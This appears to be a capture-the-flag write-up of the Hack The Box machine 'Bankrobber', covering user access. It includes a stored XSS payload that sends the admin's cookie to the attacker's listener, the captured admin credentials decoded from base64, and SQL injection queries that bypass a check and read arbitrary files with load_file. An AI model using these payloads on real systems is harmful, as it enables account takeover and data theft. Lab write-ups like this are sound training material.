---
title: bankrobber user 
author: fieldraccoon
date: 2020-07-09
categories: [hack-the-box, windows]
tags: [hack-the-box, sqli, xss, xsrf, javascript, insane]
math: true
---

Bankrobber overall was a very unstable box and due to that it was very fiddly to get a shell and get root so i will go over the methodology of the xss and sqli in depth for the user section.

Of course we start off with an nmap:
```bash
kali@kali:~/boxes/bankrobber$ nmap -sC -sV -o nmap 10.10.10.154
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-08 06:13 EDT
Nmap scan report for 10.10.10.154
Host is up (0.034s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h03m36s, deviation: 0s, median: 1h03m36s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-08T11:17:56
|_  start_date: 2020-07-08T11:07:41
```

It showed us port `3306` on `mysql` and `445` on `smb`, we tried to connect to both of theese but were noth closed via a password protection.

Port `80` however was indeed usefull.

When visited with the site i made an account with the credentials `field:field` and loged in. Here we were greeted with a transaction page which in our case is bitcoin. There is 3 boxes for information, an id box a recipitent id box and a comment. The comment box will be abused here.

When we give it a test with random values we get a poppup about an admin reviewing it, indicating that there is an admin on the website that we can possibily exploit. 

We create a file on our box with the contents:
`hello.php`:
```php
<?php ?>
```
This file can have any contents it just needs to be a file on the server.

Next we will try and steal the admin credentials by using this file as a connection to our box and then with a listener try and read the cookies.

On the bitcoin bank website we fill out the form with any id and in the contents section we add this:
```javascript
<script>new Image().src="http://10.10.xx.xx/hello.php?output="+document.cookie;</script>
```
This simple XSS will make a connectin to our ip address and try connect to the file but in fact will be redirected by a listener and reveal the contents of the request.

We send this request and on our box we get a connection back:

```bash
ali@kali:~/boxes/bankrobber$ sudo nc -nlvp 80
[sudo] password for kali:                                                                                          
listening on [any] 80 ...                                                                                          
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.154] 49744                                                        
GET /hello.php?output=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1                
Referer: http://localhost/admin/index.php                                                                          
User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1 
Accept: */*                                                                                                        
Connection: Keep-Alive                                                                                             
Accept-Encoding: gzip, deflate                                                                                     
Accept-Language: nl-NL,en,*                                                                                        
Host: 10.10.xx.xx
```

We can see here that we are given a line of credentials
```bash
output=username=YWRtaW4%3D;%20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1
```

We decode the username and the password from base64 and read the creds in plaintext.
```bash
kali@kali:~/boxes/bankrobber$ echo YWRtaW4= | base64 -d                                                            
adminkali@kali:~/boxes/bankrobber$ echo SG9wZWxlc3Nyb21hbnRpYw== | base64 -d                                       
Hopelessromantickali@kali:~/boxes/bankrobber$
```

Then we can login with `admin:Hopelessromantic` and get access to the admin panel.

From here we can experiment with sqli to read the backdoor.php which is in control of the backdoor command on the site and what we will use to get a shell(although not in this post.)

When we type `1' or 1=1 -- -` we get presented with a panel of all the users being admin and our own user.

We can now contruct an SQL query to read the user flag.

```sql
10' UNION SELECT 1,load_file('c:\\users\\cortin\\desktop\\user.txt'),3;-- -
```
We can also cahnge the file path and read any file that we want. including the backdoor.php file which helps us build our js script to pop a shell.

Thanks for reading hope that you enjoyed.
